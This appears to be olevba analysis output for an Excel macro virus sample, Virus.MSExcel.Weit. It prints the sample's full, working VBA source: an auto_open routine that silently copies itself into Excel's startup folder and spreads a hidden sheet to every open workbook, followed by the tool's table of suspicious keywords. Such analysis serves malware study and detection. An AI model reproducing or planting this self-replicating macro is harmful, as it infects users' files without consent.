olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Weit-73bf8ff089eb6f00efa26968782a7b5d6e8c1427
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EXCELLS.bas 
in file: Virus.MSExcel.Weit-73bf8ff089eb6f00efa26968782a7b5d6e8c1427 - OLE stream: '_VBA_PROJECT_CUR/VBA/EXCELLS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim startpfad As String

    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    startpfad = Application.StartupPath
    If Right$(startpfad, 1) = "\" Then
        startpfad = startpfad + "_X_X_X_X.XLS"
    Else
        startpfad = startpfad + "\_X_X_X_X.XLS"
    End If
    If chk_first_time(startpfad) Then
        ActiveWorkbook.SaveCopyAs (startpfad)
    Else
        Close #1
    End If
    If Workbooks.Count <= 1 Then
        Workbooks.Add
    End If
    For Each w In Workbooks
        If w.Name <> ThisWorkbook.Name Then
            If Workbooks(w.Name).Sheets(1).Name <> "EXCELLS" Then
                ThisWorkbook.Sheets("EXCELLS").Copy before:=Workbooks(w.Name).Sheets(1)
                Workbooks(w.Name).Sheets("EXCELLS").Visible = False
                Application.OnSheetDeactivate = ActiveWorkbook.Name & "!EXCELLS.weitergehts"
            End If
        End If
    Next w
    Application.ScreenUpdating = True
    If ThisWorkbook.Name = "_X_X_X_X.XLS" Then
        ThisWorkbook.Close
    Else
        ThisWorkbook.Activate
    End If
End Sub

Function chk_first_time(datei As String) As Integer
Attribute chk_first_time.VB_ProcData.VB_Invoke_Func = " \n14"
    chk_first_time = False
    On Error GoTo fehler
    Open (datei) For Input As 1
    On Error Resume Next
    Exit Function
fehler:
    chk_first_time = True
    Resume Next
End Function

Sub weitergehts()
Attribute weitergehts.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    On Error Resume Next
    For Each w In Workbooks
        If w.Name <> ThisWorkbook.Name Then
            If Workbooks(w.Name).Sheets(1).Name <> "EXCELLS" Then
                ThisWorkbook.Sheets("EXCELLS").Copy before:=Workbooks(w.Name).Sheets(1)
                Workbooks(w.Name).Sheets("EXCELLS").Visible = False
                Application.OnSheetDeactivate = ""
            End If
        End If
    Next w
    Application.ScreenUpdating = True
End Sub


-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Weit-73bf8ff089eb6f00efa26968782a7b5d6e8c1427 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  EXCELL
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

